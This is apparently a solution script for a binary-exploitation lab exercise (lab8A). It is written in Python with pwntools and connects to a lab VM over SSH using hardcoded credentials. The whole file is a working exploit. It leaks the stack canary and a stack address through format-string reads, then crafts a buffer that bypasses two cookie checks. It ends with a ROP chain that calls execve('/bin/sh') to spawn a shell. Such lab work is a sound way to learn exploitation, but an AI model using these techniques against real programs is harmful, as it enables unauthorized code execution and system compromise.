
import sys
import struct

from pwn import *

def main():

  session = ssh(host="192.168.159.129", user="lab8A", password="Th@t_w@5_my_f@v0r1t3_ch@11")
  sh = session.process("/bin/sh", env={"PS1":""})

  sh.sendline("/levels/lab08/lab8A")
  sh.read()

  canary = leak_cookie(sh)
  input("REDY?")

  exploit(sh, canary)

  sh.interactive()

# exploit: craft a buffer to bypass BOTH cookie checks and overwrite return address
def exploit(sh, canary):

  ptr = leak_stack_ptr(sh)+0x460 # leak a stack address to get pointer to "/bin/sh"

  log.info("Calling readA() function")
  sendget(sh, "A")                    # call readA()

  offset2chk1 = b"B" * 16             # offset to overwritten cookie in custom canary check function
                                      # xor    eax,0xdeadbeef
                                      # cmp    edx,eax
                                      # je     0x8049167 <findSomeWords+138>
  eax = struct.pack('<I', 0xdeadbeef) # ^
  
  offset2chk2 = b"B" * 4              # offset to cookie overwrite (second check)
  
  cookie = struct.pack('<I', canary)  # original leaked cookie
  
  offset2retAddr = b"B" * 4           # offset to overwritten return address
  retAddr  = generate_rop_chain(ptr)  # rop nop into rop chain ;)
  retAddr += b"/bin/sh\x00"


  log.info("Crafting cookie check bypass for both functions")
  payload = offset2chk1 + eax + offset2chk2 + cookie + offset2retAddr + retAddr

  log.info("Sending evil buffer")
  sendget(sh, payload)

def generate_rop_chain(bin_sh_ptr):

  # execve("/bin/sh", 0, 0)
  rop_gadgets = [
    0x080481b2, # ret [lab8A]
    0x080481b2, # ret [lab8A]
    0x080481b2, # ret [lab8A]
    0x080481b2, # ret [lab8A]
    # ECX = NULL
    0x08049c73, # xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret [lab8A]
    0x41414141, # filler
    0x41414141, # filler
    0x41414141, # filler
    0x41414141, # filler
    # EDX = NULL, EBX = *ptr to "/bin/sh"
    0x080938dd, # xor edx, edx ; pop ebx ; div esi ; pop esi ; pop edi ; pop ebp ; ret [lab8A]
    bin_sh_ptr, # pointer to "/bin/sh"
    0x41414141, # filler
    0x41414141, # filler
    0x41414141, # filler
    # EAX = syscall number
    0x08096c12, # add eax, 0xb ; pop edi ; ret [lab8A]
    0x41414141, # filler
    0x0806f900, # int 0x80
  ]

  return b''.join(struct.pack('<I', _) for _ in rop_gadgets)
  

# leak_stack_ptr: exactly what you think it does ;)
def leak_stack_ptr(sh):

  stack_leak = sendget(sh, "%x", True)[:8]
  addr = int((b"0x%b" % stack_leak), 16)

  log.info("Successfully leaked stack address => 0x%x" % addr)

  return addr

# leak_cookie: leak the canary off the stack (on my system this was the 139th argument)
def leak_cookie(sh):

  stack_leak = sendget(sh, "%139$x", True)[:8]
  cookie = int((b"0x%b" % stack_leak), 16)

  log.info("Successfully leaked the canary => 0x%x" % cookie)

  return cookie

# sendget: send bytes and retrieve bytes (less code if in function)
def sendget(sh, message, print_output=False):

  sh.sendline(message)
  if print_output == False:
    sh.read()
  else:
    return sh.read()

  return

main()
